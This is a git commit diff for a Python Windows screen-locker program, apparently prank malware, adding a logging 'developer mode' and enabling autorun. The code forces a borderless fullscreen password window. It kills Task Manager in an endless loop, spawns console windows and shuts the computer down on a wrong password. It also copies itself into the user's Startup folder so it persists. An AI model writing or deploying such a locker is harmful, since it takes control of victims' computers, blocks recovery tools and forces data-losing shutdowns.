ec1967f13740e87d4db16d8fb94e0b1222f8660f
alex <sashat022007@gmail.com>
2023-11-21 21:06:18 +0600

    Add developer mode; Fixes

--- config.py
+++ config.py
@@ -1,17 +1,21 @@
-window_title = "INPUT THE PASSWORD!"
+################### window ####################
+window_title = "INPUT THE PASSWORD!" #Title for window
+run_in_fullscreen = True #Run in fullscreen
+override = True #Without borders (bottom panel)
 
-run_in_fullscreen = True
+################## Functions###################
+add_in_autorun = True #Add files in autorun
+start_thread = True #Start treard for kill taskmanager
+run_music = True #run music while programm will start
+#cmd function settings:
+run_cmd = True #run consoles
+cmd_count = 3 #count of concoles
+cmd_command = "echo your computer is caput!" #command for consoles
 
-add_in_autorun = False
-start_thread = True
+################### other #####################
+key = "123321" #password for deactivation
+os = 'w' #operation system (w/l) - for test fullscreen
 
-run_kill = True
-run_music = True
-run_cmd = True
-
-cmd_count = 3
-cmd_command = "echo your computer is caput!"
-
-key = "123321"
-
-os = 'w'
+############## Developer options ##############
+DEV_MODE = False #Activate logger (console, file); if you want use console: main.pyw->main.py
+DEV_MODE_SET_SAFE = False #Run without Dangerous functions
--- main.py
+++ main.py
@@ -11,65 +11,120 @@ import threading
 
 import config
 
-#v
+
+
 class M():
     def run_music():
+        M.logs("<M.run_music>: Method was started")
         system("start gamemusic.mp3")
+        M.logs("<M.run_music>: Music file was started;\n    End")
 
     def run_cmd(itterations, command):
+        M.logs("<M.run_cmd>: Method was started")
+
         for i in range(itterations):
             system("start cmd.exe /k" + str(command))
+            M.logs("<M.run_cmd>: cmd " + str(i) + " was created")
+        M.logs("<M.run_cmd>: End")
+
 
     def run_kill():
+        M.logs("<M.run_kill>: Method was started")
         system("start system/kill.bat")
+        M.logs("<M.run_kill>: File was killed;\n    End")
 
     def run_password():
+        M.logs("<M.run_password>: Method was started;\n    Button was pressed;\n    Request wassword...")
+        M.logs("<M.run_password>: inp_pass: " + inp_pass.get())
+
+
         if inp_pass.get() == config.key:
+            M.logs("<M.run_password>: Access granted; Start Explorer")
             system("start explorer")
+            M.logs("<M.run_password>: End of programm;\n    Exit")
             exit()
+
+
         else:
-            system("shutdown /s /t 0")
+            M.logs("<M.run_password>: Acces denide;\n    Shutdown")
+            if not config.DEV_MODE_SET_SAFE:
+                M.logs("<M.run_password>: Try real shutdown now!")
+                system("shutdown /s /t 0")
+
+            M.logs("<M.run_password>: config.DEV_MODE_SET_SAFE: Emitation of shutdown")
 
     def run_atr():
+        M.logs("<M.run_atr>: Method was started")
         try:
-            system("start system/atr.bat") 
-            M.run_kill()
-        except:
-            pass
-
-        try:
+            M.logs("<M.run_atr>: Trying using standart arsenal...")
+            M.logs("<M.art_run>: Try get data...")
             USER_NAME = getuser()
             dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
-
+            M.logs("<M.run_atr>: End of first part")
         except:
-            pass
+            M.error("<M.run_atr>: Fail of first part")
+
+        M.logs("<M.run_atr>: First part: OK")
 
         try:
+            M.logs("<M.art_run>: Try second part")
+            M.logs("<M.atr_run>: Try run .bat script...")
             system("start system/atr.bat")
+            M.logs("<M.art_run>: Try third part")
+            M.logs("<M.art_run>: Using get data (p1)...")
+            M.logs("<M.art_run>: copy ./main.py...")
             move("./main.py", dest)
+            M.logs("<M.art_run>:")
             move("./system", dest)
             move("./gamemusic.mp3", dest)
         except:
             pass
 
     def run_task_kill():
-            while True:
-                system("Taskkill /f /im taskmgr.exe")
+        while True:
+            system("Taskkill /f /im taskmgr.exe")
 
+    def logs(log_text):
+        if config.DEV_MODE:
+            f = open("log.txt", 'a')
+            f.write("logs: " + log_text + '\n')
+            print("logs: " + log_text + '\n')
+            f.close()
+    
+    def error(log_text):
+        if config.DEV_MODE:
+            f = open("log.txt", 'a')
+            f.write("logs: " + log_text + '\n')
+            print("logs: " + log_text + '\n')
+            f.close()
 
 def init():
-    if config.start_thread:
+    M.logs("===============================================\nRun theard (task killer)")
+    if config.start_thread and not config.DEV_MODE_SET_SAFE:
+
         thread_taskKiller = threading.Thread(target=M.run_task_kill)
         thread_taskKiller.start()
+    else:
+        M.logs("(Task-killer): emitation mode")
+        
+
     
     if config.run_music:
         M.run_music()
 
-    if config.add_in_autorun:
+        M.logs("Music run")
+
+    if config.add_in_autorun and not config.DEV_MODE_SET_SAFE:
         M.run_atr()
+
+        M.logs("Add in autorun")
 
     if config.run_cmd:
         M.run_cmd(config.cmd_count, config.cmd_command)
+
+        M.logs(str(config.cmd_count) + " cmds was started")
+
+    print(123)
 init()
 
 def Quit():
@@ -89,14 +144,19 @@ if not(config.run_in_fullscreen):
     alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
     root.geometry(alignstr)
 
-root.resizable(width=False, height=False)
+if not config.DEV_MODE:
+    root.resizable(width=False, height=False)
+else:
+    root.resizable(width=True, height=True)
 root["bg"] = "black"
 root.protocol("WM_DELETE_WINDOW", Quit)
 
 if config.run_in_fullscreen:
     if config.os == 'w':
         try:
-            root.overrideredirect(1)
+            if config.override:
+                root.overrideredirect(1)
+
             root.state('zoomed')
 
         except:
